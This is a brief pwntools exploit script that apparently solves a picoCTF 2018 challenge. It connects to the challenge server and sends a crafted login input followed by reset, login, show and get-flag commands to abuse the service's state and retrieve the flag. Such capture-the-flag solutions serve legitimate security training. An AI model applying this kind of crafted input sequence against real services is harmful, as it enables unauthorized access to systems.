from pwn import *

p = remote('2018shell1.picoctf.com' , 29508)
p.sendline("login abcdefgh\x05")
p.sendline("reset")
p.sendline("login aa")
p.sendline("show")
p.sendline("get-flag")
p.interactive()
